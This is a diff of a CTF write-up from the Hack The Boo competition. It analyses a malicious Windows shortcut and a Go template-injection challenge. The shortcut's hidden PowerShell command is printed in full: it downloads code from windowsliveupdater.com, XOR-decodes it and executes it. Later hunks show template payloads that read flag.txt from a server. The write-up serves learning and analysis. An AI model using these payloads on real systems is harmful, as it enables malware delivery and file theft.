@@ -15,8 +15,6 @@ For this years halloween I decided to participate in the Hack The Boo CTF compet
 ### Description
 Another night staying alone at home during Halloween. But someone wanted to play a Halloween game with me. They emailed me the subject "Trick or Treat" and an attachment. When I opened the file, a black screen appeared for a second on my screen. It wasn't so scary; maybe the season is not so spooky after all.
 
-We are given two files, a capture `capture.pcap` and a Windows Shortcut `trick_or_treat.lnk`.
-
 ### LNK File
 We start our investigation by analyzing the `lnk` file with `exiftools` by executing `exiftools trick_or_treat.lnk` on the file. Inside the file information we find something strange:
 ```
@@ -24,7 +22,7 @@ Working Directory               : C:
 Command Line Arguments          : /k for /f "tokens=*" %a in ('dir C:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe /s /b /od') do call %a -windowstyle hidden "$asvods ='';$UserAgents = @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko');$RandomUserAgent = $UserAgents | Get-Random;$WebClient = New-Object System.Net.WebClient;$WebClient.Headers.Add('User-Agent', $RandomUserAgent);$boddmei = $WebClient.DownloadString('http://windowsliveupdater.com');$vurnwos ='';for($i=0;$i -le $boddmei.Length-2;$i=$i+2){$bodms=$boddmei[$i]+$boddmei[$i+1];$decodedChar = [char]([convert]::ToInt16($bodms, 16));$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};Invoke-Command -ScriptBlock ([Scriptblock]::Create($vurnwos));Invoke-Command -ScriptBlock ([Scriptblock]::Create($asvods));
 Icon File Name                  : C:\Windows\System32\shell32.dl
 ```
-Let us take some time to analyze the script behavior. The script first selects a random User-Agent from the crafter `$UserAgents` array and crafts a WebClient object used to download content from a web server. It then uses this WebClient to download the contents of the specified URL (http://windowsliveupdater.com) and decodes the obfuscated file as follows:
+Let us take some time to analyze the script behavior. The script first selects a random User-Agent from the crafted `$UserAgents` array. It then uses a WebClient to download the contents of the specified URL (http://windowsliveupdater.com) and decodes the obfuscated file as follows:
 ```
 $vurnwos ='';
 for($i=0;$i -le $boddmei.Length-2;$i=$i+2){
@@ -234,11 +232,11 @@ Now to exploit the vulnerability, we of course need to host a website that imple
         <title>Test Page</title>
     </head>
     <body>
-        <p>{{ . }}</p>
+        <p>{{"{{"}} . {{"}}"}}</p>
     </body>
 </html>
 ```
-This page simply renders all the templates we have available to us, but we can equally call a simple template like `{{.ServerInfo.Hostname}}`.
+This page simply renders all the templates we have available to us, but we can equally call a simple template like `.ServerInfo.Hostname`.
 As discussed previously, our job is to read a file from the server (flag.txt). Lets adapt our page:
 ```
 <!DOCTYPE html>
@@ -247,7 +245,7 @@ As discussed previously, our job is to read a file from the server (flag.txt). L
         <title>Test Page</title>
     </head>
     <body>
-        <p>{{ .OutFileContents .ClientUA }}</p>
+        <p>{{"{{"}} .OutFileContents .ClientUA {{"}}"}}</p>
     </body>
 </html>
 ```
